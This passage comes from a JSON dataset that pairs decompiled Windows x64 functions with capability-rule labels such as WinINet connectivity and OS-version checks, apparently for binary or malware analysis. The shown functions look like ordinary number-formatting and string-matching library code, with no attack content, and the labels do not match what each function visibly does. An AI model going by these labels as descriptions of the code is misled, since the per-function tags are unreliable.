        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005fc00(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  int64_t noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    ulong arg2_00;\n    ulong arg3_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *arg1_00;\n    uint16_t *puVar5;\n    int64_t iVar6;\n    uint32_t uVar7;\n    ushort *puVar8;\n    uchar *puVar9;\n    char cVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uchar *puVar13;\n    int64_t *piVar14;\n    int64_t iVar15;\n    int64_t iVar16;\n    ushort *puVar17;\n    ushort *arg4_00;\n    bool bVar18;\n    ulong var_18h_2;\n    ulong var_60h;\n    ulong var_68h;\n    ulong uStack272;\n    uchar auStack264 [32];\n    int64_t aiStack232 [10];\n    uchar *puStack152;\n    uint uStack140;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    int32_t iStack116;\n    ulong uStack112;\n    uchar auStack104 [32];\n    ulong var_bp_40h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piStack128 = *arg3;\n    piStack136 = arg3[1];\n    uStack140 = noname_4;\n    aiStack232[1] = 0x14005fc63;\n    iVar4 = fcn.140026f80(arg4 + 0xd0);\n    iVar15 = *(arg4 + 8);\n    if (iVar15 < 0) {\n        iVar15 = 6;\n    }\n    aiStack232[1] = 0x14005fc85;\n    fcn.14007eab0(arg4, &stack0xffffffffffffff98);\n    puVar11 = &stack0xfffffffffffffef8;\n    piVar14 = &stack0xffffffffffffff38;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack272 = 0x14005fef5;\n        aiStack232[0] = noname_6;\n        uStack112 = fcn.1400a5680();\n        uStack272 = 0x14005ff17;\n        puVar9 = &stack0xffffffffffffff90;\n        iVar15 = aiStack232[0];\n        iVar3 = fcn.1400b66d0(&stack0xffffffffffffff90, piVar14, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar3;\n        if (0x2c < iVar3) {\n            uStack272 = 0x14005ff3a;\n            iVar16 = fcn.1400147b0(puVar9);\n            iVar16 = -iVar16;\n            puVar11 = &stack0xfffffffffffffef8 + iVar16;\n            *(&stack0xfffffffffffffef0 + iVar16) = 0x14005ff42;\n            uStack112 = fcn.1400a5680();\n            piVar14 = &stack0xffffffffffffff38 + iVar16;\n            *(&stack0xffffffffffffff18 + iVar16) = iVar15;\n            *(&stack0xfffffffffffffef0 + iVar16) = 0x14005ff62;\n            iStack116 = fcn.1400b66d0(&stack0xffffffffffffff90, piVar14, iVar3 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    else {\n        uStack272 = 0x14005fca6;\n        iVar16 = noname_6;\n        uStack112 = fcn.1400a5680();\n        aiStack232[1] = iVar16;\n        puVar9 = &stack0xffffffffffffff90;\n        uStack272 = 0x14005fcd1;\n        aiStack232[0] = iVar15;\n        puStack152 = puVar9;\n        iVar16 = aiStack232[1];\n        iVar3 = fcn.1400b66d0(puVar9, piVar14, 0x2d, &stack0xffffffffffffff98);\n        iStack116 = iVar3;\n        puVar11 = &stack0xfffffffffffffef8;\n        if (0x2c < iVar3) {\n            uStack272 = 0x14005fdcc;\n            iVar6 = fcn.1400147b0(puVar9);\n            iVar6 = -iVar6;\n            puVar11 = &stack0xfffffffffffffef8 + iVar6;\n            *(&stack0xfffffffffffffef0 + iVar6) = 0x14005fdd4;\n            uStack112 = fcn.1400a5680();\n            piVar14 = &stack0xffffffffffffff38 + iVar6;\n            *(&stack0xffffffffffffff18 + iVar6) = iVar15;\n            *(&stack0xffffffffffffff20 + iVar6) = iVar16;\n            puVar9 = puStack152;\n            *(&stack0xfffffffffffffef0 + iVar6) = 0x14005fdfa;\n            iStack116 = fcn.1400b66d0(puVar9, piVar14, iVar3 + 1, &stack0xffffffffffffff98);\n        }\n    }\n    iVar3 = iStack116;\n    iVar16 = iStack116;\n    *(puVar11 + -8) = 0x14005fceb;\n    arg1_00 = fcn.1400b9850(arg4 + 0xd0);\n    *(puVar11 + -8) = 0x14005fcfc;\n    iVar15 = fcn.1400147b0(arg1_00);\n    iVar15 = -iVar15;\n    puVar12 = puVar11 + iVar15;\n    puVar13 = puVar11 + iVar15;\n    puVar17 = puVar11 + iVar15 + 0x40;\n    pcVar2 = *(*arg1_00 + 0x58);\n    *(puVar11 + iVar15 + -8) = 0x14005fd17;\n    (*pcVar2)();\n    if (iVar16 == 0) {\n        if (*(iVar4 + 0x20) == '\\0') goto code_r0x00014005fd56;\n        puVar5 = NULL;\ncode_r0x00014005fe14:\n        *(puVar11 + iVar15 + -8) = 0x14005fe25;\n        iVar16 = fcn.1400147b0(arg1_00);\n        iVar16 = -iVar16;\n        puVar13 = puVar11 + iVar16 + iVar15;\n        puVar12 = puVar11 + iVar16 + iVar15;\n        arg4_00 = puVar11 + iVar16 + iVar15 + 0x40;\n        bVar18 = (*piVar14 - 0x2bU & 0xfd) == 0;\n        puVar8 = arg4_00;\n        if (bVar18) {\n            uVar1 = *puVar17;\n            puVar17 = puVar11 + iVar15 + 0x42;\n            iStack116 = iVar3 + -1;\n            *arg4_00 = uVar1;\n            puVar8 = puVar11 + iVar16 + iVar15 + 0x42;\n        }\n        arg2_00 = *(iVar4 + 0x10);\n        arg3_00 = *(iVar4 + 0x18);\n        *(puVar11 + iVar16 + iVar15 + 0x30) = puVar17;\n        *(puVar11 + iVar16 + iVar15 + 0x20) = puVar5;\n        *(puVar11 + iVar16 + iVar15 + 0x38) = &stack0xffffffffffffff8c;\n        *(puVar11 + iVar16 + iVar15 + 0x28) = puVar8;\n        *(puVar11 + iVar16 + iVar15 + -8) = 0x14005fe8f;\n        fcn.14005fb20(arg2, arg2_00, arg3_00);\n        iStack116 = bVar18 + iStack116;\n        iVar15 = *(arg4 + 0x10);\n        iVar16 = iStack116;\n        if (iVar15 <= iVar16) goto code_r0x00014005fd63;\n    }\n    else {\n        *(puVar11 + iVar15 + -8) = 0x14005fd30;\n        arg1_00 = piVar14;\n        puVar5 = sub.msvcrt.dll_memchr(piVar14, 0x2e, iVar16);\n        cVar10 = *(iVar4 + 0x20);\n        if (puVar5 != NULL) {\n            arg1_00 = *(iVar4 + 0x48);\n            puVar5 = puVar17 + (puVar5 - piVar14);\n            *puVar5 = *(iVar4 + 0x48);\n            if (cVar10 == '\\0') goto code_r0x00014005fd56;\n            goto code_r0x00014005fe14;\n        }\n        if ((cVar10 != '\\0') &&\n           ((iVar3 < 3 ||\n            (((*(piVar14 + 1) < ':' && (uVar7 = *(piVar14 + 2) - 0x30,  arg1_00 = uVar7,  uVar7 < 10)) &&\n             ('/' < *(piVar14 + 1))))))) goto code_r0x00014005fe14;\ncode_r0x00014005fd56:\n        iVar15 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        arg4_00 = puVar17;\n        if (iVar15 <= iVar16) goto code_r0x00014005fd63;\n    }\n    *(puVar13 + -8) = 0x14005feb5;\n    iVar4 = fcn.1400147b0(arg2);\n    iVar4 = -iVar4;\n    puVar12 = puVar13 + iVar4;\n    *(puVar13 + iVar4 + 0x28) = iVar16;\n    iVar16 = iVar15;\n    *(puVar13 + iVar4 + 0x20) = iVar15;\n    *(puVar13 + iVar4 + -8) = 0x14005fedf;\n    fcn.1400a23f0(arg4, uStack140, puVar13 + iVar4 + 0x40, arg4_00);\n    iStack116 = iVar15;\n    arg4_00 = puVar13 + iVar4 + 0x40;\ncode_r0x00014005fd63:\n    piVar14 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar10 = piStack136;\n    if (cVar10 == '\\0') {\n        pcVar2 = *(*piStack128 + 0x60);\n        *(puVar12 + -8) = 0x14005fd85;\n        iVar15 = (*pcVar2)(piVar14, arg4_00, iVar16);\n        if (iVar15 != iVar16) {\n            cVar10 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar10;\n    return;\n}\n",
        "token_count": 2701
    },
    "14005ffc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14005ffc0(int64_t **arg1, int64_t *arg2, int64_t **arg3, int64_t arg4, ulong noname_4, ulong noname_5, \n                  unkbyte10 *noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11\n                  , ulong arg_70h, ulong arg_78h, ulong arg_80h)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    ulong arg2_00;\n    ulong arg3_00;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *arg1_00;\n    int64_t iVar5;\n    uint16_t *puVar6;\n    uint32_t uVar7;\n    uchar *noname_0;\n    ushort *puVar8;\n    char cVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    int64_t *piVar13;\n    uchar *puVar14;\n    int64_t iVar15;\n    ushort *puVar16;\n    ushort *arg4_00;\n    bool bVar17;\n    ulong var_8h;\n    ulong var_50h;\n    ulong var_58h;\n    ulong uStack320;\n    uchar auStack312 [32];\n    uchar *apuStack280 [4];\n    int64_t aiStack248 [9];\n    uchar *puStack176;\n    uchar *puStack168;\n    uint uStack156;\n    unkbyte10 Stack152;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    uchar auStack120 [8];\n    ulong var_68h;\n    ulong var_60h;\n    uchar auStack96 [4];\n    ulong var_54h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    piVar13 = &stack0xffffffffffffff08;\n    piStack128 = *arg3;\n    piStack136 = arg3[1];\n    iVar5 = &fcn.14005ffc0::var_54h + 4;\n    uStack156 = noname_4;\n    Stack152 = *noname_6;\n    apuStack280[3] = 0x14006001d;\n    iVar4 = fcn.140026f80(arg4 + 0xd0);\n    puVar14 = *(arg4 + 8);\n    if (puVar14 < 0) {\n        puVar14 = 0x6;\n    }\n    apuStack280[3] = 0x14006003f;\n    fcn.14007eab0(arg4, iVar5);\n    puVar10 = &stack0xfffffffffffffec8;\n    if ((*(arg4 + 0x18) & 0x104) == 0x104) {\n        uStack320 = 0x1400602c5;\n        _auStack96 = fcn.1400a5680();\n        puVar14 = &stack0xffffffffffffffa0;\n        _auStack120 = Stack152;\n        uStack320 = 0x1400602f4;\n        apuStack280[0] = &stack0xffffffffffffff88;\n        puStack168 = puVar14;\n        iVar3 = fcn.1400b66d0(puVar14, &stack0xffffffffffffff08, 0x36, iVar5);\n        var_60h._4_4_ = iVar3;\n        if (0x35 < iVar3) {\n            uStack320 = 0x140060317;\n            iVar15 = fcn.1400147b0(puVar14);\n            iVar15 = -iVar15;\n            puVar10 = &stack0xfffffffffffffec8 + iVar15;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x14006031f;\n            _auStack96 = fcn.1400a5680();\n            piVar13 = &stack0xffffffffffffff08 + iVar15;\n            _auStack120 = Stack152;\n            *(&stack0xfffffffffffffee8 + iVar15) = &stack0xffffffffffffff88;\n            puVar14 = puStack168;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x140060345;\n            var_60h._4_4_ = fcn.1400b66d0(puVar14, piVar13, iVar3 + 1, iVar5);\n        }\n    }\n    else {\n        uStack320 = 0x140060060;\n        _auStack96 = fcn.1400a5680();\n        apuStack280[1] = &stack0xffffffffffffff88;\n        noname_0 = &stack0xffffffffffffffa0;\n        _auStack120 = Stack152;\n        uStack320 = 0x140060098;\n        apuStack280[0] = puVar14;\n        puStack176 = apuStack280[1];\n        puStack168 = noname_0;\n        iVar3 = fcn.1400b66d0(noname_0, &stack0xffffffffffffff08, 0x36, iVar5);\n        var_60h._4_4_ = iVar3;\n        puVar10 = &stack0xfffffffffffffec8;\n        piVar13 = &stack0xffffffffffffff08;\n        if (0x35 < iVar3) {\n            uStack320 = 0x140060194;\n            iVar15 = fcn.1400147b0(noname_0);\n            iVar15 = -iVar15;\n            puVar10 = &stack0xfffffffffffffec8 + iVar15;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x14006019c;\n            _auStack96 = fcn.1400a5680();\n            piVar13 = &stack0xffffffffffffff08 + iVar15;\n            _auStack120 = Stack152;\n            *(&stack0xfffffffffffffef0 + iVar15) = puStack176;\n            *(&stack0xfffffffffffffee8 + iVar15) = puVar14;\n            puVar14 = puStack168;\n            *(&stack0xfffffffffffffec0 + iVar15) = 0x1400601cb;\n            var_60h._4_4_ = fcn.1400b66d0(puVar14, piVar13, iVar3 + 1, iVar5);\n        }\n    }\n    iVar3 = var_60h._4_4_;\n    iVar15 = var_60h._4_4_;\n    *(puVar10 + -8) = 0x1400600b2;\n    arg1_00 = fcn.1400b9850(arg4 + 0xd0);\n    *(puVar10 + -8) = 0x1400600c3;\n    iVar5 = fcn.1400147b0(arg1_00);\n    iVar5 = -iVar5;\n    puVar11 = puVar10 + iVar5;\n    puVar12 = puVar10 + iVar5;\n    puVar16 = puVar10 + iVar5 + 0x40;\n    pcVar2 = *(*arg1_00 + 0x58);\n    *(puVar10 + iVar5 + -8) = 0x1400600de;\n    (*pcVar2)();\n    if (iVar15 == 0) {\n        if (*(iVar4 + 0x20) == '\\0') goto code_r0x00014006011d;\n        puVar6 = NULL;\ncode_r0x0001400601ec:\n        *(puVar10 + iVar5 + -8) = 0x1400601fd;\n        iVar15 = fcn.1400147b0(arg1_00);\n        iVar15 = -iVar15;\n        puVar12 = puVar10 + iVar15 + iVar5;\n        puVar11 = puVar10 + iVar15 + iVar5;\n        arg4_00 = puVar10 + iVar15 + iVar5 + 0x40;\n        bVar17 = (*piVar13 - 0x2bU & 0xfd) == 0;\n        puVar8 = arg4_00;\n        if (bVar17) {\n            uVar1 = *puVar16;\n            puVar16 = puVar10 + iVar5 + 0x42;\n            var_60h._4_4_ = iVar3 + -1;\n            *arg4_00 = uVar1;\n            puVar8 = puVar10 + iVar15 + iVar5 + 0x42;\n        }\n        arg2_00 = *(iVar4 + 0x10);\n        arg3_00 = *(iVar4 + 0x18);\n        *(puVar10 + iVar15 + iVar5 + 0x30) = puVar16;\n        *(puVar10 + iVar15 + iVar5 + 0x20) = puVar6;\n        *(puVar10 + iVar15 + iVar5 + 0x38) = &fcn.14005ffc0::var_60h + 4;\n        *(puVar10 + iVar15 + iVar5 + 0x28) = puVar8;\n        *(puVar10 + iVar15 + iVar5 + -8) = 0x140060267;\n        fcn.14005fb20(arg2, arg2_00, arg3_00);\n        var_60h._4_4_ = bVar17 + var_60h._4_4_;\n        iVar5 = *(arg4 + 0x10);\n        iVar15 = var_60h._4_4_;\n        if (iVar5 <= iVar15) goto code_r0x00014006012a;\n    }\n    else {\n        *(puVar10 + iVar5 + -8) = 0x1400600f7;\n        arg1_00 = piVar13;\n        puVar6 = sub.msvcrt.dll_memchr(piVar13, 0x2e, iVar15);\n        cVar9 = *(iVar4 + 0x20);\n        if (puVar6 != NULL) {\n            arg1_00 = *(iVar4 + 0x48);\n            puVar6 = puVar16 + (puVar6 - piVar13);\n            *puVar6 = *(iVar4 + 0x48);\n            if (cVar9 == '\\0') goto code_r0x00014006011d;\n            goto code_r0x0001400601ec;\n        }\n        if ((cVar9 != '\\0') &&\n           ((iVar3 < 3 ||\n            (((*(piVar13 + 1) < ':' && (uVar7 = *(piVar13 + 2) - 0x30,  arg1_00 = uVar7,  uVar7 < 10)) &&\n             ('/' < *(piVar13 + 1))))))) goto code_r0x0001400601ec;\ncode_r0x00014006011d:\n        iVar5 = *(arg4 + 0x10);\n        arg2 = arg1_00;\n        arg4_00 = puVar16;\n        if (iVar5 <= iVar15) goto code_r0x00014006012a;\n    }\n    *(puVar12 + -8) = 0x14006028d;\n    iVar4 = fcn.1400147b0(arg2);\n    iVar4 = -iVar4;\n    puVar11 = puVar12 + iVar4;\n    *(puVar12 + iVar4 + 0x28) = iVar15;\n    iVar15 = iVar5;\n    *(puVar12 + iVar4 + 0x20) = iVar5;\n    *(puVar12 + iVar4 + -8) = 0x1400602b7;\n    fcn.1400a23f0(arg4, uStack156, puVar12 + iVar4 + 0x40, arg4_00);\n    var_60h._4_4_ = iVar5;\n    arg4_00 = puVar12 + iVar4 + 0x40;\ncode_r0x00014006012a:\n    piVar13 = piStack128;\n    *(arg4 + 0x10) = 0;\n    cVar9 = piStack136;\n    if (cVar9 == '\\0') {\n        pcVar2 = *(*piStack128 + 0x60);\n        *(puVar11 + -8) = 0x14006014c;\n        iVar5 = (*pcVar2)(piVar13, arg4_00, iVar15);\n        if (iVar5 != iVar15) {\n            cVar9 = '\\x01';\n        }\n    }\n    *arg1 = piStack128;\n    *(arg1 + 1) = cVar9;\n    return;\n}\n",
        "token_count": 2883
    },
    "14006220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140062200(uint *arg1, ulong noname_1, int64_t **noname_2, int64_t **noname_3, uint *noname_4, int64_t noname_5\n                  , uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, \n                  ulong noname_11, ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    ulong *arg1_00;\n    uint64_t *puVar4;\n    char cVar5;\n    uint8_t uVar6;\n    char cVar7;\n    bool bVar8;\n    bool bVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    int64_t iVar12;\n    int64_t *piVar13;\n    int64_t **ppiVar14;\n    int64_t *piVar15;\n    int64_t *piVar16;\n    uint64_t uVar17;\n    uint uVar18;\n    int64_t *piVar19;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint64_t uVar22;\n    bool bVar23;\n    bool bVar24;\n    ulong var_8h;\n    uint32_t *var_50h;\n    ulong auStack224 [5];\n    ulong uStack184;\n    ulong *puStack176;\n    uint64_t uStack168;\n    ulong *puStack160;\n    int64_t **ppiStack152;\n    int64_t iStack144;\n    int64_t **ppiStack136;\n    int64_t *piStack128;\n    uint64_t *puStack120;\n    int64_t *var_68h;\n    int64_t *var_60h;\n    ulong var_58h;\n    int64_t *var_50h_2;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h_2;\n    \n    var_50h_2 = *noname_2;\n    var_48h._0_4_ = *(noname_2 + 1);\n    var_48h._4_4_ = *(noname_2 + 0xc);\n    var_60h = *noname_3;\n    var_58h._0_4_ = *(noname_3 + 1);\n    var_58h._4_4_ = *(noname_3 + 0xc);\n    noname_7 = noname_7 + 0xd0;\n    auStack224[0] = 0x14006224b;\n    piVar11 = fcn.1400b97f0(noname_7);\n    auStack224[0] = 0x14006225a;\n    iVar12 = fcn.1400147b0(noname_7);\n    iVar12 = -iVar12;\n    puStack176 = &fcn.140062200::var_60h;\n    puStack160 = &fcn.140062200::var_50h_2;\n    *(&stack0xffffffffffffff20 + iVar12) = 0x14006227a;\n    cVar5 = fcn.140029dd0(&fcn.140062200::var_50h_2, &fcn.140062200::var_60h);\n    puVar3 = puStack160;\n    if (cVar5 == '\\0') {\n        *(&stack0xffffffffffffff20 + iVar12) = 0x1400622ae;\n        fcn.140029e90(puVar3);\n        pcVar1 = *(*piVar11 + 0x20);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x1400622bc;\n        cVar5 = (*pcVar1)(piVar11);\n        pcVar1 = *(*piVar11 + 0x10);\n        *(&stack0xffffffffffffff20 + iVar12) = 0x1400622c9;\n        uVar6 = (*pcVar1)(piVar11);\n        if (noname_6 != 0) {\n            var_68h = var_68h & 0xffffffffffffff00 | uVar6;\n            puStack120 = &stack0xffffffffffffff48 + iVar12;\n            ppiStack136 = &stack0xffffffffffffff48 + iVar12 + noname_6 * 8;\n            uVar17 = 0;\n            uVar22 = 0;\n            do {\n                while( true ) {\n                    uVar20 = uVar17;\n                    pcVar1 = *(*piVar11 + 0x20);\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x140062328;\n                    cVar7 = (*pcVar1)(piVar11);\n                    if (cVar5 != cVar7) break;\ncode_r0x00014006232d:\n                    uVar2 = *(noname_5 + uVar20 * 8);\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x14006233e;\n                    piVar13 = sub.msvcrt.dll_strlen(uVar2);\n                    ppiStack136[uVar22] = piVar13;\n                    uVar21 = uVar22 + 1;\n                    puStack120[uVar22] = uVar20;\n                    uVar17 = uVar20 + 1;\n                    uVar22 = uVar21;\n                    if (noname_6 == uVar20 + 1) goto code_r0x00014006235b;\n                }\n                pcVar1 = *(*piVar11 + 0x10);\n                *(&stack0xffffffffffffff20 + iVar12) = 0x140062309;\n                cVar7 = (*pcVar1)(piVar11);\n                if (var_68h == cVar7) goto code_r0x00014006232d;\n                uVar17 = uVar20 + 1;\n            } while (noname_6 != uVar20 + 1);\ncode_r0x00014006235b:\n            puVar4 = puStack120;\n            if (1 < uVar22) {\n                uStack168 = uVar20 + 1;\n                iStack144 = uVar22 * 8;\n                piVar13 = *ppiStack136;\n                ppiStack152 = ppiStack136 + 1;\n                piVar19 = NULL;\ncode_r0x000140062398:\n                ppiVar14 = ppiStack152;\n                piVar16 = piVar13;\n                do {\n                    if (*ppiVar14 < piVar16) {\n                        piVar16 = *ppiVar14;\n                    }\n                    ppiVar14 = ppiVar14 + 1;\n                } while (iStack144 + ppiStack136 != ppiVar14);\n                piVar19 = piVar19 + 1;\n                if (var_50h_2[2] < var_50h_2[3]) {\n                    var_48h._0_4_ = 0xffffffff;\n                    var_50h_2[2] = var_50h_2[2] + 1;\n                    puVar3 = puStack176;\n                    arg1_00 = puStack160;\n                    piVar15 = var_50h_2;\n                }\n                else {\n                    var_68h = var_50h_2;\n                    pcVar1 = *(*var_50h_2 + 0x50);\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x1400626d2;\n                    (*pcVar1)();\n                    var_48h._0_4_ = 0xffffffff;\n                    puVar3 = puStack176;\n                    arg1_00 = puStack160;\n                    piVar15 = var_68h;\n                }\n                puStack176 = puVar3;\n                puStack160 = arg1_00;\n                if (piVar19 == piVar16) {\n                    var_48h._0_4_ = -1;\n                    *(&stack0xffffffffffffff20 + iVar12) = 0x1400626f6;\n                    cVar5 = fcn.140029dd0(arg1_00, puVar3);\n                    if (cVar5 == '\\0') {\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x140062709;\n                        fcn.140029e90(arg1_00);\n                        pcVar1 = *(*piVar11 + 0x20);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x140062715;\n                        uVar6 = (*pcVar1)(piVar11);\n                        uVar17 = 0;\n                        var_68h = var_68h & 0xffffffffffffff00 | uVar6;\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x140062722;\n                        fcn.140029e90(arg1_00);\n                        pcVar1 = *(*piVar11 + 0x10);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x14006272e;\n                        uVar6 = (*pcVar1)(piVar11);\n                        ppiVar14 = ppiStack136;\n                        uStack184._7_1_ = cVar5;\n                        puStack120 = puStack120 & 0xffffffffffffff00 | uVar6;\n                        piStack128 = piVar13;\n                        do {\n                            if (piVar19 < ppiVar14[uVar17]) {\n                                pcVar1 = *(*piVar11 + 0x20);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x14006276a;\n                                cVar5 = (*pcVar1)(piVar11);\n                                if (var_68h != cVar5) {\n                                    pcVar1 = *(*piVar11 + 0x10);\n                                    *(&stack0xffffffffffffff20 + iVar12) = 0x14006277f;\n                                    cVar5 = (*pcVar1)(piVar11);\n                                    if (puStack120 != cVar5) goto code_r0x000140062788;\n                                }\n                                piVar13 = piStack128;\n                                cVar5 = '\\x01';\n                                break;\n                            }\ncode_r0x000140062788:\n                            uVar17 = uVar17 + 1;\n                            piVar13 = piStack128;\n                            cVar5 = uStack184._7_1_;\n                        } while (uVar17 != uVar22);\n                    }\n                    else {\n                        cVar5 = '\\0';\n                    }\n                    uVar17 = 0;\n                    do {\n                        if ((piVar19 == piVar13) == cVar5) {\n                            uVar22 = uVar22 - 1;\n                            iStack144 = uVar22 * 8;\n                            puVar4[uVar17] = puVar4[uVar22];\n                            ppiStack136[uVar17] = ppiStack136[uVar22];\n                            if (uVar22 <= uVar17) goto code_r0x0001400627e9;\n                        }\n                        else {\n                            uVar17 = uVar17 + 1;\n                            if (uVar22 <= uVar17) goto code_r0x0001400627e9;\n                        }\n                        piVar13 = ppiStack136[uVar17];\n                    } while( true );\n                }\n                var_48h._0_4_ = -1;\n                if (piVar19 < piVar16) goto code_r0x000140062550;\n                goto code_r0x0001400623fa;\n            }\n            piVar19 = NULL;\ncode_r0x0001400623fa:\n            piVar13 = var_50h_2;\n            if (uVar22 == 1) {\n                piVar19 = piVar19 + 1;\n                *(&stack0xffffffffffffff20 + iVar12) = 0x140062411;\n                fcn.14009b630(piVar13);\n                var_48h._0_4_ = -1;\ncode_r0x000140062418:\n                piStack128 = *puVar4;\ncode_r0x00014006241c:\n                puStack120 = *ppiStack136;\n                if (piVar19 < puStack120) {\n                    bVar23 = var_58h == -1;\n                    var_68h = *(noname_5 + piStack128 * 8);\n                    piVar13 = var_50h_2;\n                    do {\n                        bVar24 = var_48h == -1;\n                        bVar8 = piVar13 != NULL && bVar24;\n                        ppiStack136._0_1_ = bVar24;\n                        if (bVar8) {\n                            if (piVar13[3] <= piVar13[2]) {\n                                ppiStack136 = ppiStack136 & 0xffffffffffffff00 | bVar8;\n                                pcVar1 = *(*piVar13 + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x14006298b;\n                                iVar10 = (*pcVar1)(piVar13);\n                                if (iVar10 == -1) {\n                                    var_50h_2 = NULL;\n                                    goto code_r0x000140062472;\n                                }\n                            }\n                            ppiStack136._0_1_ = 0;\n                        }\ncode_r0x000140062472:\n                        bVar9 = var_60h != NULL && bVar23;\n                        bVar8 = bVar23;\n                        if (bVar9) {\n                            if (var_60h[3] <= var_60h[2]) {\n                                ppiStack136 = ppiStack136 & 0xffffffffffffff00 | ppiStack136;\n                                pcVar1 = *(*var_60h + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x1400629d2;\n                                iVar10 = (*pcVar1)();\n                                if (iVar10 == -1) {\n                                    var_60h = NULL;\n                                    bVar8 = bVar9;\n                                    goto code_r0x00014006248b;\n                                }\n                            }\n                            if (ppiStack136 == 0) goto code_r0x0001400628dd;\n                        }\n                        else {\ncode_r0x00014006248b:\n                            if (ppiStack136 == bVar8) goto code_r0x0001400628dd;\n                        }\n                        pcVar1 = *(*piVar11 + 0x20);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x1400624a5;\n                        cVar5 = (*pcVar1)(piVar11);\n                        piVar13 = var_50h_2;\n                        if (((var_50h_2 != NULL) && (bVar24)) && (var_50h_2[3] <= var_50h_2[2])) {\n                            pcVar1 = *(*var_50h_2 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x1400629ae;\n                            iVar10 = (*pcVar1)(piVar13);\n                            if (iVar10 == -1) {\n                                var_50h_2 = NULL;\n                                piVar13 = NULL;\n                            }\n                        }\n                        pcVar1 = *(*piVar11 + 0x20);\n                        *(&stack0xffffffffffffff20 + iVar12) = 0x1400624c8;\n                        cVar7 = (*pcVar1)(piVar11);\n                        if (cVar7 != cVar5) {\n                            pcVar1 = *(*piVar11 + 0x10);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x1400624de;\n                            cVar5 = (*pcVar1)(piVar11);\n                            if (((piVar13 != NULL) && (bVar24)) && (piVar13[3] <= piVar13[2])) {\n                                pcVar1 = *(*piVar13 + 0x48);\n                                *(&stack0xffffffffffffff20 + iVar12) = 0x1400629f5;\n                                iVar10 = (*pcVar1)(piVar13);\n                                if (iVar10 == -1) {\n                                    var_50h_2 = NULL;\n                                }\n                            }\n                            pcVar1 = *(*piVar11 + 0x10);\n                            *(&stack0xffffffffffffff20 + iVar12) = 0x1400624fb;\n                            cVar7 = (*pcVar1)(piVar11);\n                            piVar13 = var_50h_2;\n                            if (cVar7 != cVar5) goto code_r0x0001400628dd;\n                        }\n                        if (piVar13[2] < piVar13[3]) {\n                            piVar13[2] = piVar13[2] + 1;\n                        }\n                        else {\n                            pcVar1 = *(*piVar13 + 0x50);\n                            *(&stack0xffffffffffffff20 + 